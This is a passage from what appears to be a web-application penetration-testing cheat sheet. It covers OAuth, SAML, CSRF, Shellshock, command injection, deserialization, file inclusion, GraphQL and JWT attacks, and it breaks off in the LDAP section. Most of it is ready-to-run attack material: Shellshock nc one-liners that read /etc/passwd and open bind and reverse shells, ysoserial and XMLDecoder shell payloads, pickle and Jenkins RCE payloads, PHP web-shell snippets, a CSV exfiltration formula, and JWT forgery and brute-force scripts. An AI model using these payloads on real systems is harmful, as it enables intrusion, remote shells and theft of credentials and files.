5. Get access to resource server with phished (legitimate) token

```
## Exemplary Malicious Page (super simple)
## Once the victim visit this site, the authorize-form is automatically sent to authorization server
## It only works if Anti-CSRF mechanism is NOT in place

<html>
<head>
</head>
<body onload="document.getElementById('csrf').submit();">
    <form action="http://authorization-server.com/oauth/authorize" accept-charset="UTF-8" method="post" id="csrf">
        <input name="utf8" type="hidden" value="✓">
        <input type="hidden" name="authenticity_token" value="">
        <input type="hidden" name="client_id" id="client_id" value="xxx">
        <input type="hidden" name="redirect_uri" id="redirect_uri" value="http://yourMaliciousPage/">
        <input type="hidden" name="state" id="state">
        <input type="hidden" name="response_type" id="response_type" value="code">
        <input type="hidden" name="scope" id="scope" value="">
        <input type="hidden" name="code_challenge" id="code_challenge">
        <input type="hidden" name="code_challenge_method" id="code_challenge_method">
        <input type="submit" name="commit" value="Authorize" class="btn btn-success btn-lg btn-block" data-disable-with="Authorize">
    </form>
</body>
</html>
```

```
## RUBY SCRIPT: Turn retrieved Code into Access Token 
## "gem install oauth2" in the first place
## Legitimate OAuth-Client required to get app_id and secret

require 'oauth2'

callback = "xxx"
app_id = "xxx"

secret = "xxx"
client = OAuth2::Client.new(app_id, secret, site: "http://authorization-server.com")
client.auth_code.authorize_url(redirect_uri: callback)

code="xxx"
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token
```
- To get what you are looking for:
- `curl -H "Authorization: Bearer [token]" http://resource-server.com/api/keys --dump-header -`

<br />

## SAML
- **Security Assertion Markup Language**
- Often used to provide Single Sign-On (SSO) between one or multiple Service Provider(s) (SP) and one IDentity Provider (IDP)
- Distinct issues can occur, which turns this protocol vulnerable !

### Missing verification of SAML Response signature
  - Start the SAML interaction
  - Intercept the SAMLResponse
  - Tamper with the SAMLResponse (e.g. change the email address)
  - Forward the malicious SAMLResponse to the Service Provider
  - Use a script for automation:
```
#!/usr/bin/python3

import base64
from urllib.parse import unquote, quote_from_bytes

def saml(data):
    response = (base64.b64decode(unquote(data))).decode('utf-8')
    response = response.replace("mega@mega","admin@examplecorp.com")
    response = quote_from_bytes(base64.b64encode(response.encode('utf-8')))
    print(response)

file = open('/path/to/saved/legitimate/SAMLresponse', 'r').read()
saml(file)
```

### XML Canonicalization
- [Details](https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations)
  - SAML Responses contain strings that identify the authenticating user
  - XML canonicalization (in most cases) will remove comments as part of signature validation
  - So, adding comments to SAML Response will not invalidate the signature
  - XML text extraction may only return a substring of the text within an XML element when comments are present
- Therefore the following might be possible
- From `xyz@example.com` to `admin<!---->@example.com` will lead to SAML login as admin
- To do so, one need to register a user as `admin<!---->@example.com`
- Bypass:
  - Open WebDev Tool and change input field from `email` to `text`
  - Intercept the valid register request with a proxy and change the name field on-the-fly 

<br />

## XSRF/CSRF
## HowTo
### Bypass Techniques
1. Remove the CSRF token from request
  - Before: `X-CSRF-Token: 1HDn1tNp_5Nd4KQku7ns0V90FUHbMmulhIvP88-W6MvELR_MMZ9_XnwtGyb51XU1cCzZ6FmphkyrwU2rMFsOyQ`
  - After: `X-CSRF-Token: `
2. Replace the CSRF token with random value but same length
  - Before: `X-CSRF-Token: 1HDn1tNp_5Nd4KQku7ns0V90FUHbMmulhIvP88-W6MvELR_MMZ9_XnwtGyb51XU1cCzZ6FmphkyrwU2rMFsOyQ`
  - After: `X-CSRF-Token: randomrandomrandomrandomrandomrandomrandomrandomrandomrandomrandomrandomrandomrandom`
3. Decode the CSRF token
  - Base64, MD5, SHA1 etc.
4. Use valid CSRF token only partially
  - Before: `X-CSRF-Token: 1HDn1tNp_5Nd4KQku7ns0V90FUHbMmulhIvP88-W6MvELR_MMZ9_XnwtGyb51XU1cCzZ6FmphkyrwU2rMFsOyQ`
  - After: `X-CSRF-Token: 1HDn1tNp_5Nd4KQku7ns0V90FUHbMmulhIvP88-ndomrandomrandomrandomrandomrandomrandomrandom`
5. Use CSRF token from meta-header
  - Maybe cookieName and headerName of CSRF token are differently, and thus modifying the cookie value is not sufficient
```
<!DOCTYPE html>
<html>
<head>
<meta name="csrf-token" content="1HDn1tNp_5Nd4KQku7ns0V90FUHbMmulhIvP88-W6MvELR_MMZ9_XnwtGyb51XU1cCzZ6FmphkyrwU2rMFsOyQ" />
[...]
</head>
```
- Copy into HTTP header: `X-CSRF-Token: 1HDn1tNp_5Nd4KQku7ns0V90FUHbMmulhIvP88-W6MvELR_MMZ9_XnwtGyb51XU1cCzZ6FmphkyrwU2rMFsOyQ`

<br />

## CGI (COMMON GATEWAY INTERFACE)
## Info
- CGIs commonly use Python or Perl, but in few cases also Shell or even C
- When you call a CGI, the web server will start a new process and run the CGI
- The web server uses environment variables (inside HTTP Header) to pass information to CGI 
- A HTTP header named XYZ in your request will lead to an environment variable named HTTP_XYZ in CGI 

## Howto
- **Shellshock Exploitation**
```
#Netcat: Exfiltration of /etc/passwd
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: victim.com\r\nConnection: close\r\n\r\n" | nc victim.com 80

#Bind Shell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -lp 9999 -e /bin/sh\r\nHost: victim.com\r\nConnection: close\r\n\r\n" | nc victim.com 80

#Reverse Shell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc yourServer 443 -e /bin/sh\r\nHost: victim.com\r\nConnection: close\r\n\r\n" | nc victim.com 80
#On your machine
nc -lp 443
```

<br />

## COMMAND INJECTION
## Info
- Find out what language is used by the application:
   - Look at the response's headers and in different formats (JSON, HTML, Raw etc.)
   - Generate errors
   - Look how special characters are handled by the application (by comparing `+` and `.` for concatenation of strings)
   - You may have to enter special characters **URL-encoded** or **Base64-encoded** (!)
- Know how to comment out in different programming languages (to get rid of the code added by the application)
   - PHP: `//` 
   - SQL: `/* random value */`
   - Concatenation: `"."ha"."ck"."er"."` instead of `hacker`
- The challenge is to break out of the code syntax and keep a clean syntax
- Carefully observe the error or warning calls and modify your command injection accordingly

## HowTo 
- Sequential: `command1 ; malicious_code` (after command1 succeeds, perform malicious_code)
- Pipeline: `command1 | malicious_code` (use output of exploit as input for malicious_code)
- Substitution: `command1 'malicious_code'` (output of malicious_code as arg to exploit)
- Substitution: `command1 $(malicious_code)` (output of malicious_code as arg to exploit)
- Redirection: `command1 > ~/.bashrc` (overwrite bashrc)
- AND: `command1 && malicious_code` --> run command2 if command1 succeeds
- OR: `command1 || malicious_code` --> that will run command2 if command1 fails

```
## PHP ##
#inject command inside quotes
http://example.com/?name=".system('uname -a');"

#adding dummy code
".system('uname -a'); $dummy="

#using comments
".system('uname -a');# or ".system('uname -a');//

#random data + close brackets + your injection + comment out
http://example.com/?order=age);}system('uname -r');//`


## Ruby ##
# Ruby needs backticks ` ` to execute code
# 1)
#Underlying code syntax: eval "\"Hello "+params['username']+"\""
http://example.com/?username=hacker"%2B`uname`%2B"

# 2)
#Download tool for "CVE-2013-0156: Rails Object Injection": https://gist.github.com/postmodern/4499206
#Syntax: $ rails_rce.rb URL COMMAND
rails_rce.rb http://example.com/ "puts '/usr/bin/cat'" rails3		#pass '/usr/bin/cat' as string
rails_rce.rb http://example.com/ '`/usr/bin/cat`' rails3		#pass '/usr/bin/cat' as command

# 3)
#use %x{} for code execution
rails_rce.rb http://example.com/ %x{whoami} rails3		        #pass 'whoami' as command


## Python ##
#Check if python is present with str(True)
http://example.com/hacker"%2bstr(True)%2b"
# 1)
http://example.com/hacker"%2bstr(os.system('id'))%2b"
  ⇒ one cannot store the output of the command into a variable
  ⇒ if command returns “32512” it means “command not found” (exit code in bash would be 127)
  ⇒ if module “os” is not present you use this instead: `__import__('os').system(...)`
  ⇒ http://example.com/hacker"%2Bstr(__import__('os').system(__import__('base64').b64decode('payload')).read())%2B%22
# 2)
http://example.com/hacker"%2bstr(os.popen('id').read())%2b": alternatively .readline() or .readlines()
  ⇒ Store the output of a command (open file object)
  ⇒ One can read from the file object only once
  ⇒ Waits for the completion of a command before providing the full output (compared to os.system)
  ⇒ To check if command worked successfully: 
    • output = os.popen('id')
    • print(output.close()): should return “None” for successful command execution
# 3)
http://example.com/hacker"%2bstr(subprocess.run('id'))%2b"


## Perl ##
http://example.com/hacker'.`uname`.'
http://example.com/hacker'.system(...).'
http://example.com/hacker'.exec(...).'
```
<br />

## CSV Injection
## Info
- [Swissky Repo CSV](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)

## HowTo
- Enter into excel cell: `=HYPERLINK(CONCAT(\"http://www.metager.de/?leak=\",A1),\"test \")`

<br />

## (DE)SERIALIZATION
## Info
- Serialisation of objects is used to make storage within applications more efficient/easier
- If an application needs to store an instance of a class, it can use serialization to get a string representation of this object
- When the application needs to use the instance again, it will simply unserialise the string
- An attacker who can tamper the string could potentially trigger unexpected behaviour or remote code execution in the application
- You need to pickle the object on the same platform:
	- If the vulnerable system is Linux system, you need to pickle on Linux machine
	- A pickled object for Windows has to be created on Windows platform
	- Potential bypass in **Python**: use `subprocess` with `__import__`
- If you send malicious pickled objects to a Web App, it probably responds with 500 error due to unknown object
- However, the code likely gets executed before the error message appears
- A good indicator for serialized objects in **Java** is the string `rO0`, which is the base64 encoded version of `\xac\xed\x00`
- Serialised Java objects contain many special characters and thus normally get encoded before being transmitted over HTTP
- Helpful Burp extension: [Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3)
- Helpful tool [ysoserial](https://github.com/frohoff/ysoserial)
	- Example Code Snippet (Bind Shell): `java -jar ysoserial-0.0.4.jar Spring1 '/usr/bin/nc -l -p 9999 -e /bin/sh' | base64 -w 0`

## HowTo
### Python: Pickle Module 
- `pickle.dumps()`: This function is called to serialize an object hierarchy
- `pickle.loads()`: This function is called to de-serialize a data stream
```
#python2
import os
import cPickle

class foo(object):
  def __reduce__(self):
   return (os.system,("cat /etc/passwd",))

f = foo()
print cPickle.dumps(f)

## OUTPUT of python2 example.py
cposix
system
p1
(S'cat /etc/passwd'
p2
tp3
Rp4
.


#python3
import os
import pickle

class foo(object):
  def __reduce__(self):
   return (os.system,("cat /etc/passwd",))

f = foo()
dump = pickle.dumps(f)
print(dump.decode('unicode-escape')

## OUTPUT of python3 example.py decoded as string
# 3posixsystem/usr/bin/cat /etc/passwd
# R.
```

### XMLDecoder
- XMLDecoder is a **Java class** that creates object based on a XML message
- Code execution on the server is possible, if user-controlled data is injected and unserialized as object
- The Code snippet has to be written in Java

```
##Code we want to run on the server
#1 cat command
Runtime run = Runtime.getRuntime();
String[] commands = new String[] { "/usr/bin/cat", "/etc/passwd" };
run.exec(commands );

#2 Bind shell
Runtime run = Runtime.getRuntime();
String[] commands = new String[] { "/usr/bin/nc", "-l","-p", "9999", "-e", "/bin/sh" };
run.exec(commands );

##Prepare payload as XML code
#1 cat command
#the function “exec()” is nested inside the Runtime Object

<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="2">
          <void index="0">
              <string>/usr/bin/cat</string>
          </void>
          <void index="1">
              <string>/etc/passwd</string>
          </void>
      </array>
      </void>
 </object>
</java>


#2 Bind shell
#Instead of Runtime().exec() we use ProcessBuilder

<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <void class="java.lang.ProcessBuilder">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      <void method="start" id="process">
    </void>
    </void>
</java>
```

### Jenkins
- Jenkins is an open source automation server
- It helps automate building, testing, and deploying, which facilitate both continuous integration and continuous delivery
- Jenkins supports serialised objects based on XStream
- In the past, code execution could be exploited through java.beans.EventHandler, but not anymore 
- However, there are third party libraries embedded in Jenkins that may still allow the possibility of RCE. Example: **CVE-2016-0792**
- Below payload is based on Groovy, which is used in conjunction with XStream
- Further details: [Contrast Security](https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream)

```
#use as POST request, e.g. POST /createItem?name=random HTTP/1.1
#change the content-type: text/xml
#insert the payload in your request
#if you succeed you will likely get a 500 Server error
#check the HTTP response and search for “debug”. It may say something like below picture

<map>
  <entry>Also, as with most (all?) session mechanisms that send back a signed cookie to the client, the session cannot be immediately invalidated since an attacker will still be able to use the old session even if a new empty one has been sent to him. 
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>whoami</string>    			#you can add several strings here, subject to your payload content
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```

![image](https://user-images.githubusercontent.com/84674087/151032695-50d93f51-2a84-4766-ba13-08d990b97f04.png)

### PHP
- If the targeted PHP application deserializes data under your control, you can leverage this circumstence by finding an object with a call to one of these "helper" functions:
  - `__wakeup()`: when an object is deserialized
  - `__destruct()`: when an object is deleted
  - `__toString()`: when an object is converted to a string
- You will need to review the source code of the application, if possible: `/var/www/index.php`


<br />

## DIRECTORY TRAVERSAL
## Info
- Windows: You will be able to access `test/../../../file.txt`, even if the directory test does not exist
- Linux: Not possible 
- This might be useful when you can inject user-controlled data to create a file name
- Example: $file = "/var/www/example_".$_GET['id'].".txt";

## HowTo
- `http:example.com/../../../../../../../etc/passwd`: most common use case
- `http:example.com/var/www/../../../../../etc/passwd`: if the begining of the path is fixed
- `http:example.com/../../../../../../../etc/passwd%00`: to bypass server-side code added at the end (applicable to old Perl and PHP versions)


<br />

## FILE INCLUSION
## Info
### Remote
- **Attacker uploads file from external source**
- These PHP functions are vulnerable:
    - **allow_url_include**
    - **allow_url_fopen**
    - **include() / include_once()**
    - **require() / require_once()**
- Examples:
    - Inject remote file from own server: https://example.com/login.php?user=http://malware.bad/malicious.php
    - Inject malicious script: https://example.com/login.php?user=malicious.php
- Get rid off server-side code endings:
    - Add `&blah=` or `?blah=` depending on your URL

### Local 
- **Attacker retrieves a file that already exists on hosting server**
- Null Byte Attack
   - https://example.com/login.php?user=../../Windows/system32/cmd.exe%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htaccess%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htpasswd%00
   - %00 terminates string to avoid adherence of specific extension (e.g. .php)
- Base64
   - ?user=php://filter/read=convert.base64-encode/resource=/etc/passwd
   - Decode the server response separately to get target output
- Fuzzing via Burpsuite Intruder (Directory Traversal)
- LFI Suite:
   - [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)

### Best Practice
- Input Validation (Whitelisting allowed file extensions)
- Exclude the directory separators “/” 
- Patch php version regularly


## HowTo
### Code to check while enumerating RFI
- `<?php phpinfo() ?>`
- `<?php system("whoami"); ?>`
- ```<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>```
- ```<?php $c=$_GET[‘c’]; echo `$c`; ?>```
- `<?php passthru($_GET['cmd']); ?>`
- `<?php echo shell_exec("whoami");?>` For shell_exec to output the result you need to echo it

#### Files to check while enumerating LFI
- `../../../../../../../etc/passwd`
- `../../../../../../../home/<users>/.ssh/authorized_keys`
- `../../../../../../../home/<users>/.ssh/bash_history`
- To get the username of who we’re running as: `../../../../../../../proc/self/environ`
- To see what binary is running this service: `../../../../../../../proc/self/cmdline`
- index.php / config.php / settings.php / php.ini

<br />

## GRAPHQL
## Info
- [Introduction](https://graphql.org/learn/) on GrapQL
- A handy feature of GrapQL to get better insight into the existing DB is [Introspection](https://graphql.org/learn/introspection/)
- If you are lucky the webapp has the **frontend graphiql** left enabled: `http://example.com/graphql`
- There you can interactively send queries and get response from the DB in an easy-to-read fashion
- If the frontend is not activated you have to use an Interception Proxy to inspect the query and its parameters

## HowTo
- Gather information about the DB thanks to **Introspection**
- The output can be saved as json and rendered within your browser: `nano /tmp/output.json`, in your browser: `file:///tmp/output.json`
- Then you can either query directly the information you are looking for or you leverage an **SQLi attack**: `UNION SELECT`

```
POST /graphql HTTP/1.1
Host: vulnerable_host
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 1248
Origin: vulnerable_host
Connection: close
Referer: vulnerable_host

{"query":"query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        locations\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    } \n  }   \n      \n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }     \n        \n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    } \n  }\n"
}
```
- SQLi Example: Wherein we try to catch `id, value` from table `passwords`, while the original query is performed on table `xyz` with susceptible variable `id`
```
{
  "operationName":"xyz",
  "variables":{"id":"1 or 1=1 UNION SELECT 1,id,value FROM passwords" },
  "query":
  "query xyz($id: ID!) {\n  xyz(id: $id) {\n    id\n    name\n    description\n    __typename\n}\n}\n"
}
```

<br />

## HTTP HEADERS (SECURE)
## Info
1. **Strict Transport Security** (enforce HTTPS)
2. **XSS Protection** (standard in modern browsers)
3. **X-Frame-Options** (against clickjacking)
4. **Content Type Options** (use “nosniff” to prevent drive-by-downloads due to maliciously declared content-types)
	- Downloads could be treated as executable or dynamic HTML file
5. **Referrer-Policy** (against data leakage)
6. **Cache-control** (against data leakage)
7. **Content-Security-Policy** (against CORS)

### Best Practice (Blue Team)
- `Strict-Transport-Security: max-age=16070400; includeSubDomains`
- `X-XSS-Protection: 1; mode=block`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: SAMEORIGIN`
- `Content-Security-Policy: default-src 'self'`
- `Cache-control: no-cache, no-store`
- `Cache-control: must-revalidate`: Browser Back button can be stopped from showing sensitive data
- `Pragma: no-cache`
- `Referrer-Policy: no-referrer / same-origin`

<br />

## HTTP METHOD MANIPULATION
## HowTo
### Authentication bypass
- Getting 2xx or 3xx HTTP response with other HTTP methods apart from `GET` and `POST`
```
## Option 1)
PUT /test.html HTTP/1.1
Host: testing-website

## Option 2)
$ ncat www.example.com 80
HEAD /admin HTTP/1.1
Host: www.example.com
```
### HTTP Parameter Pollution
- Supplying multiple HTTP parameters with the same name
- `http://example.com/?search_string=kittens&num_results=100&search_string=puppies`: Example 
- Analyze the response. How did the server parse your input?

### Web Server with TRACE/TRACK enabled (XST)
- Details: [https://owasp.org/Cross_Site_Tracing](https://owasp.org/www-community/attacks/Cross_Site_Tracing)
- "XST could be used as a method to steal user’s cookies via XSS"
- "This is possible even if the cookie has the “HttpOnly” flag set or exposes the user’s Authorization header"
- `curl -X TRACE www.example.org`
- `curl -X TRACE -H "Cookie: name=value" www.example.org`

<br />

## JSON WEB TOKEN
## Info
### Syntax
- JWT = `Base64(header) + "." + Base64(payload) + "." + Base64(signature)`
- signature = `HMACSHA256(Base64(header) + "." + Base64(payload), SECRET_KEY)`

### Best Practice (Blue Team)
- Use a secure connection during token transfer
- Never transfer user’s sensitive data in tokens, limiting oneself to impersonal identifiers
- Limit the JWT lifetime and use refresh tokens
- Keep one or several authorised algorithms on the application side (dismiss all tokens with different signature algorithm)
- Work with one algorithm only, e.g. HS256 or RS256 (Available: RSA based, Elliptic curves, HMAC, **None**)

## Howto
### Attack Pattern: Algorithm "None"
1. Register a User
2. Retrieve the cookie
3. Decode the cookie
4. Tamper the cookie
5. Re-encode the cookie
	- If you change “algorithm” to “None”, then **remove the signature part but leave the last “.”**
	- Additonally **you may need to remove "=" from base64 encoded strings** before pasting into the cookie
   	- Example Original: `eyJhbGciOiJkkkkkklIkpXUyJ9.eyJsb2dpbiI6InBhdG8ikkzY2MDUxIn0.MTU5MDE2...OThiMTliNg`
   	- Example Modified: `eyJhbGciOiJlllllklIkpXUyJ9.eyJsb2iuiuziuziuii8ikkzY2MDUxIn0.`
7. Send the new cookie

### Attack Pattern: Change from "RS256" to "HS256"
- The application will call the method verify when you send the cookie: `verify(public_key, data)`
- If you change to HMAC, the application will do: `HMAC(public_key, data)`
- As an attacker, you only need the public key which is actually public
```
import base64
import hashlib
import hmac

#original token
jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImNvb2wifQ.g_lQv2mSHZftlYwE4p4fHPJWvrT20JQ57RcOWyYxVPf4t_bJOHtwyQ2h1s_6ZDW_RsVHRpoXbJd17WeJERVZ43JvbX_jXMlbwwRccW3sYOMkSMwPXNBuZK_zO5MOPFghzO7jPaNjaHCvPMdeZfIgjpjJxW1cdQQyiaGgmI9kfIoDSptTOdoSa1cvk1YmCK55Zgd7tFNSwXANERaOtaJXAe_DJSCIQy1aBJjh6AVSsutSWyZ383mLCVcq6D0bEGlJZ6ct_ZCa7n1t8t1GX4tTft0SjUOu5W0TCYPTKx--PRmPDU88dwBRaoYHujqNa3iZDGxd9PymAxIJzVd1Z0vmyQ"

#new_header = {"typ":"JWT","alg":"HS256"}   #change from RS256 to HS256
new_header = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
#new_payload = {"login":"admin"}            #change to admin
new_payload = "eyJsb2dpbiI6ImFkbWluIn0="

with open('./public.pem', 'rb') as data:
    publickey = data.read()
    newjwt = new_header + "." + new_payload
    newjwt_encoded = newjwt.encode('utf-8')
    sig = base64.urlsafe_b64encode(hmac.new(publickey, newjwt_encoded, hashlib.sha256).digest()).decode('UTF-8').strip("=")
    newtoken = newjwt + "." + sig
    print(newtoken)
```   

### Attack Pattern: Brute Force Weak Secret (HMAC)
```
#!/usr/bin/python3

import hashlib
import hmac
import base64
import requests

jwt_orig = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
header, payload, signature = jwt_orig.split(".")

payload_decoded = (base64.urlsafe_b64decode(payload + "==")).decode("utf-8")
payload_admin = (base64.urlsafe_b64encode((payload_decoded.replace("null", '"admin"')).encode("utf-8"))).decode("utf-8")
jwt_new = header + "." + payload_admin

wordlist = ["hacker","jwt","insecurity","pentesterlab","hacking"]

for secret in wordlist:
    sig = base64.urlsafe_b64encode(hmac.new(secret.encode("utf-8"), jwt_new.encode('utf-8'), hashlib.sha256).digest()).decode('UTF-8').strip("=")
    token_new = jwt_new + "." + sig
    print("token: ", token_new)
    response = requests.get("http://example.com/", cookies={'auth': token_new})
    if 'success' in response.text:
        print("Correct secret is: ", secret)
```

### Attack Pattern: Key Identifier (kid)
- The key is normally retrieved from the internal file system or a database
- This key (to create the signature) is retrieved BEFORE the signature gets verified
- **Directory Traversal**:
  - If you can modify the key (by using a file that you control), you can tamper the token and create a valid signature
  - A file you can control is, for instance, bootstrap.css of the target website: `ẁget http://example.com/css/bootstrap.css`
```
#!/usr/bin/python3

import hashlib
import hmac
import base64
import requests

jwt_orig = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"
header, payload, signature = jwt_orig.split(".")
header_decoded = (base64.urlsafe_b64decode(header + "==")).decode("utf-8")
payload_decoded = (base64.urlsafe_b64decode(payload + "==")).decode("utf-8")
data = open("bootstrap.css","rb")
secret = data.read()

header_modified = (base64.urlsafe_b64encode((header_decoded.replace("0001", "public/css/bootstrap.css")).encode("utf-8"))).decode("utf-8").strip("=")
payload_modified = (base64.urlsafe_b64encode((payload_decoded.replace("null", '"admin"')).encode("utf-8"))).decode("utf-8").strip("=")
jwt_modified = header_modified + "." + payload_modified
sig = base64.urlsafe_b64encode(hmac.new(secret, jwt_modified.encode('utf-8'), hashlib.sha256).digest()).decode('UTF-8').strip("=")
token_new = jwt_modified + "." + sig
response = requests.get("http://example.com/", cookies={'auth': token_new})
print("token_new: ", token_new)
print("HTTP Response: ", response.text)

data.close()
```

### Attack Pattern: Add Arbitrary JWK (JSON Web Key) Attribute (CVE-2018-0114)
- TLDR: Add JWK attribute to JWT-Header by forging your own key (to sign the token)
- A) Grep legitimate JWT
- B) Decode and tamper 
- C) Generate RSA key pair and extract n & e
- D) Sign your payload
- E) Encode and format everything properly and generate a new malicious token, signed with your RSA key
- Some Details:
   - [PublicNumbers e & n](https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/?highlight=public_numbers()#cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey.public_numbers)
   - [Padding](https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/?highlight=pkcs1v15#signing)
   - [JsonDOC](https://docs.python.org/3/library/json.html)
```
import OpenSSL
import hashlib
import json
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def generate_RSAKey_for_JWT():
    key = OpenSSL.crypto.PKey()
    key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
    priv = key.to_cryptography_key()
    pub = priv.public_key()
    e = pub.public_numbers().e
    n = pub.public_numbers().n
    header["jwk"]["e"] = base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1,byteorder='big')).decode().rstrip("=")
    header["jwk"]["n"] = base64.urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1,byteorder='big')).decode().rstrip("=")
    return header, priv

def generateToken():
    header, priv = generate_RSAKey_for_JWT()
    payload = base64.urlsafe_b64encode("admin".encode('utf-8')).decode().rstrip("=")
    jwt = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + payload
   
    sig = priv.sign(bytes(jwt, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())
    sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
    token = jwt + "." + sig
    print("token: ", token)


header = {"alg":"RS256",
          "jwk":  { "kty":"RSA",
                    "kid":"m842YgNl7cRIo2Oipw2ZDlIMQMB3XQXV5g1o0aD_5DY",
                    "use":"sig",
          	   #"n":"n4EPtAOCc9Alke...........rNP5zw",
          	   #"e":"AQAB"
                  }
          }

generateToken()
```

<br />

- **SQLi**:
  - You can modify the key by selecting a value at your choice using
  - The webapp will retrieve the modified key when you tamper the SQL query
  - Thus you get a valid signature with modified content
```
#!/usr/bin/python3

import hashlib
import hmac
import base64
import requests

jwt_orig = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"
header, payload, signature = jwt_orig.split(".")
header_decoded = (base64.urlsafe_b64decode(header + "==")).decode("utf-8")
payload_decoded = (base64.urlsafe_b64decode(payload + "==")).decode("utf-8")
secret = "3"		#<---- define the secret yourself !

#Let the application doesn't find the key in the first place (because "aaaaaaaaaa" doesn't yield any result)
#Instead define the key yourself by extending the query with "UNION SELECT"

header_modified = (base64.urlsafe_b64encode((header_decoded.replace("0001", "aaaaaaaaaaa' UNION SELECT '3")).encode("utf-8"))).decode("utf-8").strip("=")
payload_modified = (base64.urlsafe_b64encode((payload_decoded.replace("null", '"admin"')).encode("utf-8"))).decode("utf-8").strip("=")
jwt_modified = header_modified + "." + payload_modified
sig = base64.urlsafe_b64encode(hmac.new(secret.encode("utf-8"), jwt_modified.encode('utf-8'), hashlib.sha256).digest()).decode('UTF-8').strip("=")
token_new = jwt_modified + "." + sig
response = requests.get("http://example.com/", cookies={'auth': token_new})
print("token_new: ", token_new)
print("HTTP Response: ", response.text)
```

<br />

## LIGHTWEIGHT DIRECTORY ACCESS PROTOCOL (LDAP)
## Info
### LDAP Syntax
- Boolean OR: `(|(cn=[INPUT1])(cn=[INPUT2]))` --> to get records matching [INPUT1] or [INPUT2]
- Boolean AND: `(&(cn=[INPUT1])(userPassword=[INPUT2]))` --> to get records matching cn=[INPUT1] and password=[INPUT2]
- LDAP can parse wildcards `*` 
- Remove server-side code with Nullbyte `%00`
- LDAP Password Formats:
   -  `{CLEARTEXT}`, `{MD5}`, `{SMD5}` (salted MD5), `{SHA}`, `{SSHA}` (salted SHA1), `{CRYPT}`

### Null Bind
- If you are lucky, the target system runs LDAP with authorised NULL Bind
- If null values are sent, the LDAP server will proceed to bind the connection
- The credentials may get verified as correct
- You need to completely remove `username=&password=` from your query to send null values
	
## HowTo
- `example.com/?name=admin&password=admin`: normal URL
